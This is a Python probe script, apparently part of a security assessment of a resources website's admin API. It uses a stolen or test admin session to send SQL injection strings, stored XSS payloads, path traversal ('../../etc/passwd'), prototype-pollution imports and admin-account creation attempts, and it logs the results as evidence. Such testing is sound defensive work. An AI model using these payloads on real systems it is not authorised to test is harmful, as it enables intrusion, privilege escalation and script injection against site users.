#!/usr/bin/env python3
"""11 管理接口滥用：参数/ID 处理、导入导出、设置、审计、回收站、预览、反馈处理。"""
import json
import re
import sys

sys.path.insert(0, "/media/sunhao/F/Project/sanjiang-resources-site/reports/security/2026-10-21-attacker/scripts")
from probe_client import session, record, csrf_from, BASE

RES = {}
JAR = "/tmp/sj-attacker/probe/adm.jar"


def note(k, v):
    RES[k] = v
    print(f"[{k}] {json.dumps(v, ensure_ascii=False)[:700]}")


def load_jar(path):
    s = session()
    for line in open(path):
        line = line.rstrip("\n")
        if not line.strip() or (line.startswith("#") and not line.startswith("#HttpOnly_")):
            continue
        line = line.replace("#HttpOnly_", "")
        parts = line.split("\t")
        if len(parts) >= 7:
            s.cookies.set(parts[5], parts[6], domain=parts[0], path=parts[2])
    return s


def main():
    s = load_jar(JAR)
    d = s.get(BASE + "/admin/", timeout=20)
    note("admin_valid", d.status_code)
    c = csrf_from(d.text)

    def manage(name, **fields):
        data = {"csrf": c, **fields}
        r = s.post(BASE + "/api/manage/", data=data, headers={"Origin": BASE},
                   allow_redirects=False, timeout=30)
        rec = record(name, "POST", "/api/manage/", r, {"Origin": BASE},
                     {k: (v[:80] if isinstance(v, str) else v) for k, v in fields.items()})
        return r, rec[1]

    # A. ID 与参数处理
    cases = [
        ("publish-missing", {"action": "publish", "id": "no-such-id", "version": "1"}),
        ("delete-missing", {"action": "delete-resource", "id": "no-such-id", "version": "1"}),
        ("publish-bad-version", {"action": "publish", "id": "probe-xss", "version": "999"}),
        ("publish-negative-version", {"action": "publish", "id": "probe-xss", "version": "-1"}),
        ("publish-version-sqli", {"action": "publish", "id": "probe-xss", "version": "1 OR 1=1"}),
        ("unpublish-id-sqli", {"action": "unpublish", "id": "gimp' OR '1'='1", "version": "1"}),
        ("checklink-missing", {"action": "check-link", "id": "no-such-id"}),
        ("checklink-id-injection", {"action": "check-link", "id": "gimp'--"}),
        ("update-user-missing", {"action": "update-user", "id": "999", "role": "admin", "active": "true"}),
        ("update-user-bad-role", {"action": "update-user", "id": "3", "role": "superadmin", "active": "true"}),
        ("create-user-shortpw", {"action": "create-user", "username": "shortpw", "password": "short", "role": "editor"}),
        ("create-user-badname", {"action": "create-user", "username": "<script>x</script>", "password": "Valid1234567!", "role": "editor"}),
        ("create-user-dup", {"action": "create-user", "username": "atk-editor", "password": "Valid1234567!", "role": "editor"}),
        ("create-user-role-admin", {"action": "create-user", "username": "probe-admin", "password": "Valid1234567!", "role": "admin"}),
        ("bulk-review-forged", {"action": "bulk-review", "ids": "no-such,../etc", "mark": "verified"}),
        ("unknown-action", {"action": "drop-tables"}),
        ("empty-action", {"action": ""}),
    ]
    out = {}
    for name, fields in cases:
        r, stem = manage(name, **fields)
        out[name] = {"status": r.status_code, "location": r.headers.get("location"),
                     "msg": re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))[:120]}
    note("manage_cases", out)

    # B. 设置写入与前台渲染（scenario 文案、featuredResourceId）
    set_cases = [
        ("settings-html", {"action": "save-settings", "featuredResourceId": "probe-xss",
                           "scenario.design.task": "<img src=x onerror=alert('set')>",
                           "scenario.design.detail": "\"><svg onload=alert('set2')>",
                           "scenario.design.glyph": "<script>alert('glyph')</script>"}),
        ("settings-unknown-key", {"action": "save-settings", "featuredResourceId": "gimp",
                                  "some.unknown.key": "value"}),
        ("settings-bad-featured", {"action": "save-settings", "featuredResourceId": "../../etc/passwd"}),
    ]
    sout = {}
    for name, fields in set_cases:
        r, _ = manage(name, **fields)
        sout[name] = {"status": r.status_code, "msg": re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))[:120]}
    note("settings_cases", sout)
    home = s.get(BASE + "/", timeout=20)
    note("home_after_settings", {
        "status": home.status_code,
        "raw_onerror": "onerror=alert('set')" in home.text,
        "danger": sorted(set(re.findall(r"onerror=|onload=|<script", home.text)))[:5],
    })
    record("home-after-settings", "GET", "/", home)

    # C. 导出（寻找导出端点）
    export_probe = {}
    for path in ["/admin/export/", "/api/export/", "/admin/export.json", "/api/manage/?action=export"]:
        r = s.get(BASE + path, allow_redirects=False, timeout=20)
        export_probe[path] = {"status": r.status_code, "ctype": r.headers.get("content-type"),
                              "len": len(r.content), "cd": r.headers.get("content-disposition")}
        record("export-" + re.sub(r"[^a-zA-Z0-9]", "_", path), "GET", path, r)
    r, _ = manage("export-post", action="export")
    export_probe["POST action=export"] = {"status": r.status_code,
                                          "ctype": r.headers.get("content-type"),
                                          "len": len(r.content),
                                          "cd": r.headers.get("content-disposition"),
                                          "head": r.text[:120]}
    note("export_probe", export_probe)

    # D. 导入：畸形 JSON / 原型污染 / 路径式 id / 超长
    imp = {}
    payloads = {
        "malformed": "{not json",
        "array": "[]",
        "proto": json.dumps({"__proto__": {"polluted": True}, "resources": [], "categories": []}),
        "path-id": json.dumps({"categories": [{"id": "../../etc", "name": "x"}], "resources": []}),
        "html-name": json.dumps({"categories": [{"id": "probe-cat", "name": "<img src=x onerror=alert('cat')>"}],
                                 "resources": []}),
    }
    for label, pl in payloads.items():
        r, _ = manage("import-" + label, action="import-apply", payload=pl)
        imp[label] = {"status": r.status_code,
                      "msg": re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))[:160]}
    note("import_cases", imp)
    cats = s.get(BASE + "/admin/categories/", timeout=20)
    note("category_render", {"status": cats.status_code,
                             "raw_onerror": "onerror=alert('cat')" in cats.text,
                             "escaped": "&lt;img" in cats.text})
    record("admin-categories-after-import", "GET", "/admin/categories/", cats)

    # E. 预览 IDOR 与路径
    prev = {}
    for path in ["/admin/preview/resources/probe-xss/", "/admin/preview/resources/no-such/",
                 "/admin/preview/guides/no-such/", "/admin/preview/resources/../users/",
                 "/admin/preview/resources/%2e%2e%2fusers%2f"]:
        r = s.get(BASE + path, allow_redirects=False, timeout=20)
        prev[path] = {"status": r.status_code, "len": len(r.content),
                      "location": r.headers.get("location")}
        record("preview-" + re.sub(r"[^a-zA-Z0-9]", "_", path), "GET", path, r)
    note("preview_cases", prev)

    # F. 审计页与回收站
    for path in ["/admin/audit/", "/admin/trash/", "/admin/reviews/", "/admin/notices/",
                 "/admin/metrics/", "/admin/maintenance/"]:
        r = s.get(BASE + path, allow_redirects=False, timeout=20)
        txt = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))
        note("page_" + path.strip("/").replace("/", "_"),
             {"status": r.status_code, "excerpt": txt[:200]})

    with open("/tmp/sj-attacker/evidence/11-admin-api-summary.json", "w") as f:
        json.dump(RES, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
